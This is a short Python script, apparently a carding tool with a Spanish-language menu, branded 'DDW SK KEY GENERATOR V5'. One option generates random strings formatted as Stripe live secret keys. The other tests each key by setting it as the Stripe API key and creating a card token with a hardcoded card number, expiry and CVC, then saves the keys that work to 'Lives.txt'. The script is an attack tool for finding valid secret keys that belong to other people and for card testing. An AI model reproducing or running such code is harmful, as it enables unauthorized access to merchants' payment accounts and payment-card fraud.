import stripe,random,string,colorama,termcolor,time,os
colorama.init()
os.system('clear')
def logo():
	print(termcolor.colored('''
	   

DDW SK KEY
        GENETATOR V5                                                                   
                                                                           
"2.8.9"                                                
                                	
				''',color = 'magenta'))
logo()
print(termcolor.colored('1',color = 'green'),end = "      -      GENERADOR SK KEY\n")
print(termcolor.colored('2',color = 'green'),end = "      -      CHECKER SK LIVE \n")
print(termcolor.colored('3',color = 'green'),end = "      -      CERRAR\n")
otp = input('\n  > ')
def generator():
	os.system('clear')
	logo()
	many = input("\n[+] Coloca La Cantidad que quieres generar = ")
	count = 0
	def id_generator(size=24, chars=string.ascii_letters + string.digits):
	    axel = ''.join(random.choice(chars) for _ in range(size))
	    laast = 'sk_live_' + axel
	    return laast
	f = open('Sk_Generated.txt','a')
	print('\n')
	for i in range(int(many)):
	    count += 1
	    keys = id_generator()
	    f.write(f'{keys}\n')
	    print(termcolor.colored(f'{keys}',color = 'cyan'))
	print(termcolor.colored(f'\n{many} SK KEY GENERADA CORRECTAMENTE!',color = 'cyan'))
if otp == "1": generator()
def checker():
	os.system('clear')
	logo()
	where = open(input(' Coloca Tu Carpeta de SK KEY= ')).readlines()
	for line in where:
		line = line.replace('\n','')
		stripe.api_key = line
		try:
			bawandar = stripe.Token.create(
			card={
		     "number": "4270960002013126",
		     "exp_month": 3,
		     "exp_year": 2023,
		     "cvc": "948",
		   },
		 )
			chm = str(bawandar).split('"livemode":')[1]
			chm = chm.split(',\n')[0]
			if "true" in chm:
				print(termcolor.colored(f'{line}      |      LIVE <\>',color = 'green'))
				w = open('Lives.txt','a').write(f'{line}\n')
		except:
		 print(termcolor.colored(f'{line}      |      DEAD ×',color = 'red'))
		 continue
if otp == '2': checker()
elif otp == 'X': exit()
else: exit()